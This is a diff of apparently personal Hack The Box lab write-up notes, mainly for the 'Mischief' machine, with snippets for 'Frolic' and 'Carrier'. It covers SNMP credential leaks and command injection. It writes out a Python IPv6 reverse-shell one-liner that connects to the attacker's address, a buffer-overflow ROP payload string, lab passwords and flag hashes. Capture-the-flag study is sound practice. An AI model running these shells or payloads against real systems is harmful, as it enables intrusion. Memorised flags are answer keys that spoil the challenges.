@@ -1,10 +1,10 @@
 HTB MISCHIEF
-1)Enumeration shows open port 22, 3366 and upd 161 running snmp 
+1)Enumeration shows open port 22, 3366 and upd 161 running snmp
 2)So we do snmpwalk -v 1 -c 10.10.10.92 and throws a bunch of info
 3)searching for good info i found on snmp log a user and a password:   loki:godofmischiefisloki running on a SimpleHTTPAuthServer.
-4)then going to 10.10.10.92:3366 ask for user and password so we provide the credentials we found and login 
+4)then going to 10.10.10.92:3366 ask for user and password so we provide the credentials we found and login
 5)There some new credentials in here loki:trickeryanddeceit
-6)we found an image 
+6)we found an image
 7)image its rabitt hole
 8)from nmap full scan we notice some more ports and from snmpwalk we notice apache and mysql its running but not showing up so it mus be ipv6.
 9)so we download an ipv6 ennumeration tool like enyx for snmp run it and shows ipv6 address: [dead:beef::250:56ff:feb9:a728]
@@ -14,13 +14,37 @@ HTB MISCHIEF
 13)tried all basic users standar users, none seems to work after i remember another standard user administrator -.- that worked with second password.
 14)we managed to login to the Command Execution Panel and try a few commands and looks that theyre not working.
 15)In fact they work but as we see in snmpwalk enumeration all the output its being send to /dev/null so we must find a way to redirect it to us.
-16)So we must run our command like this: cat /home/loki/* &> STDOUT  ||->>>>>>>>> 
+16)So we must run our command like this: cat /home/loki/* &> STDOUT  ||->>>>>>>>>
        so in shorter explaination we redirect the output to the standard or STDOUT and we cat /home/loki/*  (all) because
-       while i was trying to read the contents it doesnt work if i just typed /home/loki/credentials so we cat all and 
-	   redirect it to stdout!
+       while i was trying to read the contents it doesnt work if i just typed /home/loki/credentials so we cat all and
+       redirect it to stdout!
+and got ssh passwd   lokiisthebestnorsegod
 17)Privilege Scalation
-
-
+18)Searching in lokis home im not being able to find anything also loki's user cannot run sudo or su so we must find a way to get to another user.
+ 
+The user we use to get the loki's password it was www-data user so we execute a reverse ipv6 shell from command console on ipv6 browser with:
+ 
+notice we have to use our ipv6 local address
+ 
+python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1384",4444,0,3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
+ 
+and got ourselves a shell for www-data and it can execute sudo or su.
+19)we must find www-data su password and we found in loki's .bash_history in the python part:  
+ 
+lokipasswordmischieftrickery
+ 
+we gain root access but the flag isnt located here, get a shell it says.
+ 
+20)But we are in a root shell we dont need anything more so we search for another root.txt file with command
+ 
+find -name root.*
+ 
+and the flag its stored in usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+ 
+so we navigate to that dir and cat root.txt with its content:
+ 
+ae155fad479c56f912c65d7be4487807
+ 
 HTB FROLIC
  
 1) As always enum
@@ -64,7 +88,7 @@ so exploit its
 python -c 'print "A"*48+"B"*4+"\xe0\x97\xec\xb7"+"\xc8\x97\xec\xb7"+"\x0b\x4a\xf7\xb7"+"\xe0\xf0\xfd\xbf"+"\xe0\xf0\xfd\xbf"'
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 24)run ./rop $(exploit)
-25)cat root flag
+25)cat root flag   85d3fdf03f969892538ba9a731826222
  
 HTB CARRIER
 1)Do a full port scan TCP and UDP
